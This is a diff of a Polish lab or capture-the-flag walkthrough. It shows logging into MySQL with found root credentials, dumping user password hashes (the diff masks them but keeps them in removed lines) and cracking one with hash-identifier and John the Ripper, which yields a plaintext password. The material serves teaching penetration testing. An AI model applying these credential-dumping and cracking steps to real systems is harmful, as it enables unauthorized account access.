@@ -341,7 +341,7 @@ define('DB_HOST', 'localhost');
 
 Jak widzimy możemy zalogować się do MySQL za pomocą danych `root:mysql`
 
-##3. Enumeracja bazdy danych MySQL
+## 3. Enumeracja bazy danych MySQL
 
 `mysql -u root -pmysql`
 
@@ -528,26 +528,38 @@ select User,Password from user;
 +------------------+-------------------------------------------+
 | User             | Password                                  |
 +------------------+-------------------------------------------+
-| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
-| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
-| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
-| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
-| debian-sys-maint | *B95758C76129F85E0D68CF79F38B66F156804E93 |
-| unclestinky      | *9B776AFB479B31E8047026F1185E952DD1E530CB |
-| phpmyadmin       | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
+| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| root             | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| debian-sys-maint | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| unclestinky      | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+| phpmyadmin       | *XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
 +------------------+-------------------------------------------+
 7 rows in set (0.01 sec)
 ```
+Naszym targetem będzie użytkownik _unclestinky_. Zanim przystąpimy do dalszych działań, użyjemy narzędzia o nazwie **hash-identifier**. W wyniku dostajemy:
 
-Pozostaje nam zapisać dane do pliku _mysql_db.txt_ i doprowadzić tekst do formatu `user:hash`, tak aby przyjął go JohnTheRipper. \
+```
+Possible Hashs:
+[+] MySQL 160bit - SHA-1(SHA-1($pass))
+```
+Teraz czas na password cracking z użyciem **John The Ripper**
 
-Dalej użyjemy listę _rockyou_, którą wykorzystamy jako słownik z potencjalnymi hasłami
-
-`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt`
+Pozostaje nam zapisać dane do pliku _mysql_hashes.txt_ i doprowadzić tekst do formatu `user:hash` (można manualnie lub za pomocą kombinacji komend)
 
 
+`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt` \
+Otwórzmy plik:
 
+`john --show mysql_hash.txt`
 
+```
+root@kali:~/Pulpit# john --show mysql_hashes.txt
+unclestinky:wedgie57
+
+1 password hash cracked, 0 left
+```
 
 
 
